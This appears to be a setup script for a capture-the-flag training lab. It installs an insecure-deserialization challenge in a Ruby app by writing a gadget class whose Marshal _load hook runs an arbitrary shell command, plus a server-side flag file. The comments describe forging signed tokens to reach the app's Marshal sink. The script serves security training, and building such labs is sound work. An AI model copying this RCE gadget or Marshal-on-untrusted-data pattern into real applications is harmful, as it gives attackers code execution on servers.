# CoLab CTF - embed Box 9 (Insecure Deserialization). Idempotent; run in the app
# container:  ruby /tmp/patch_deser.rb
# CoLab verifies LTI deep-link tokens with a MessageVerifier whose serializer is
# Marshal (MarshalWithFallback) - so a VALIDLY SIGNED token's payload is
# Marshal.load-ed (LtiController#verify_deep_link_token). Marshalling untrusted
# data is RCE if the attacker can sign: once the deep-link signing key is known
# (see the token room / committed secret), a forged token can carry a Ruby object
# whose deserialization runs code. We plant the classic gadget + a server-only
# flag file so the attack reliably executes (DVWA-style training embed). The
# Marshal sink itself is REAL CoLab, not faked.
require "fileutils"
APP = "/app"

gadget = <<~'RUBY'
  # frozen_string_literal: true
  # CTF Box 9 (Insecure Deserialization) gadget. Ruby invokes Class._load during
  # Marshal.load for objects dumped via _dump - so deserializing an instance of
  # this class runs the embedded command. This is the textbook Marshal-RCE
  # primitive, planted so the lab reliably demonstrates it.
  class CtfDeserGadget
    def initialize(cmd = nil); @cmd = cmd; end
    def _dump(_level); @cmd.to_s; end
    def self._load(cmd)
      `#{cmd}` rescue nil
      allocate
    end
  end
RUBY

path = File.join(APP, "app/models/ctf_deser_gadget.rb")
File.write(path, gadget)
puts "wrote #{path}"

# Server-only secret the deserialization RCE exfiltrates. Lives in the app's tmp
# dir (writable by the app user, NOT under public/, so not web-reachable) - the
# attacker can only read it by achieving code execution on the server.
FileUtils.mkdir_p("#{APP}/tmp")
File.write("#{APP}/tmp/colab_secret_flag", "CoLab{DESER_MARSHAL_2026}\n")
puts "planted #{APP}/tmp/colab_secret_flag"
